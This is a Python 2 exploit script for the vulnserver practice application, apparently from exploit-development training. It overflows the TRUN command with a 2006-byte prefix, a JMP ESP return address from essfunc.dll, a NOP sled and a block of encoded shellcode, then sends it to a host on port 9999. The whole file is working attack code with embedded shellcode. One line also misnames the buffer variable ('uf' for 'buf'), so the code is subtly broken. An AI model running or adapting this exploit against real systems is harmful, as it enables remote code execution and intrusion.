#!/usr/bin/python2
import socket

server = '192.168.1.138'  # Windows 7 vulnserver IP
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'      # JMP ESP (essfunc.dll)
nopsled = '\x90' * 16         # NOP sled
uf =  b""
buf += b"\xdb\xcb\xd9\x74\x24\xf4\xbb\x4d\x2f\x90\x01\x5a"
buf += b"\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x13\x03\x17"
buf += b"\x3c\x72\xf4\x5b\xaa\xf0\xf7\xa3\x2b\x95\x7e\x46"
buf += b"\x1a\x95\xe5\x03\x0d\x25\x6d\x41\xa2\xce\x23\x71"
buf += b"\x31\xa2\xeb\x76\xf2\x09\xca\xb9\x03\x21\x2e\xd8"
buf += b"\x87\x38\x63\x3a\xb9\xf2\x76\x3b\xfe\xef\x7b\x69"
buf += b"\x57\x7b\x29\x9d\xdc\x31\xf2\x16\xae\xd4\x72\xcb"
buf += b"\x67\xd6\x53\x5a\xf3\x81\x73\x5d\xd0\xb9\x3d\x45"
buf += b"\x35\x87\xf4\xfe\x8d\x73\x07\xd6\xdf\x7c\xa4\x17"
buf += b"\xd0\x8e\xb4\x50\xd7\x70\xc3\xa8\x2b\x0c\xd4\x6f"
buf += b"\x51\xca\x51\x6b\xf1\x99\xc2\x57\x03\x4d\x94\x1c"
buf += b"\x0f\x3a\xd2\x7a\x0c\xbd\x37\xf1\x28\x36\xb6\xd5"
buf += b"\xb8\x0c\x9d\xf1\xe1\xd7\xbc\xa0\x4f\xb9\xc1\xb2"
buf += b"\x2f\x66\x64\xb9\xc2\x73\x15\xe0\x8a\xb0\x14\x1a"
buf += b"\x4b\xdf\x2f\x69\x79\x40\x84\xe5\x31\x09\x02\xf2"
buf += b"\x36\x20\xf2\x6c\xc9\xcb\x03\xa5\x0e\x9f\x53\xdd"
buf += b"\xa7\xa0\x3f\x1d\x47\x75\xef\x4d\xe7\x26\x50\x3d"
buf += b"\x47\x97\x38\x57\x48\xc8\x59\x58\x82\x61\xf3\xa3"
buf += b"\x45\x4e\xac\xaa\x1c\x26\xaf\xac\x1f\x0c\x26\x4a"
buf += b"\x75\x62\x6f\xc5\xe2\x1b\x2a\x9d\x93\xe4\xe0\xd8"
buf += b"\x94\x6f\x07\x1d\x5a\x98\x62\x0d\x0b\x68\x39\x6f"
buf += b"\x9a\x77\x97\x07\x40\xe5\x7c\xd7\x0f\x16\x2b\x80"
buf += b"\x58\xe8\x22\x44\x75\x53\x9d\x7a\x84\x05\xe6\x3e"
buf += b"\x53\xf6\xe9\xbf\x16\x42\xce\xaf\xee\x4b\x4a\x9b"
buf += b"\xbe\x1d\x04\x75\x79\xf4\xe6\x2f\xd3\xab\xa0\xa7"
buf += b"\xa2\x87\x72\xb1\xaa\xcd\x04\x5d\x1a\xb8\x50\x62"
buf += b"\x93\x2c\x55\x1b\xc9\xcc\x9a\xf6\x49\xec\x78\xd2"
buf += b"\xa7\x85\x24\xb7\x05\xc8\xd6\x62\x49\xf5\x54\x86"
buf += b"\x32\x02\x44\xe3\x37\x4e\xc2\x18\x4a\xdf\xa7\x1e"
buf += b"\xf9\xe0\xed"

padding = 'F' * (3000 - 2006 - 4 - 16 - len(buf))
attack = prefix + eip + nopsled + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, sport))

print s.recv(1024)
print "Sending attack to TRUN . with length", len(attack)

s.send('TRUN .' + attack + '\r\n')
print s.recv(1024)

s.send('EXIT\r\n')
print s.recv(1024)

s.close()
